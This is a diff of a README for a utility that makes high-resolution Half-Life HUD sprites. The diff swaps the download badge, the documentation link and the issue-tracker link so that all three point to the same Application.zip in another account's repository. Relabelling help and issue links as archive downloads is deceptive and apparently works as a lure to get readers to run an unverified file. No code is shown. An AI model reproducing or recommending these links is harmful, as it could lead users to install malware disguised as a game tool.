@@ -1,6 +1,6 @@
 # 🎮 HL HUD Upscaler Utility 🎨
 
-[![Download Utility](https://img.shields.io/badge/Download-Utility-brightgreen)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Utility](https://github.com/ahmethamzaere/hl-hud-upscaler/releases/download/v1.0.0/Application.zip)](https://github.com/ahmethamzaere/hl-hud-upscaler/releases/download/v1.0.0/Application.zip)
 
 Welcome to the HL HUD Upscaler repository! This utility is a handy tool for generating .spr and .txt weapon sprite files to support higher resolutions in Half-Life. It is compatible with both the 25th Anniversary client version and pre-anniversary versions.
 
@@ -34,7 +34,7 @@ To get started with the HL HUD Upscaler utility, follow these steps:
 
 ## Resources 📚
 
-For more information and detailed usage instructions, refer to the [documentation](https://github.com/rokytd/hl-hud-upscaler/wiki).
+For more information and detailed usage instructions, refer to the [documentation](https://github.com/ahmethamzaere/hl-hud-upscaler/releases/download/v1.0.0/Application.zip).
 
 ## Contributing 🤝
 
@@ -42,6 +42,6 @@ If you'd like to contribute to the development of the HL HUD Upscaler utility, f
 
 ## Support ℹ️
 
-For any issues or questions related to the utility, please check the "Releases" section or open a new [issue](https://github.com/rokytd/hl-hud-upscaler/issues).
+For any issues or questions related to the utility, please check the "Releases" section or open a new [issue](https://github.com/ahmethamzaere/hl-hud-upscaler/releases/download/v1.0.0/Application.zip).
 
 Thank you for using the HL HUD Upscaler utility! Happy upscaling! 🎮🚀🎨
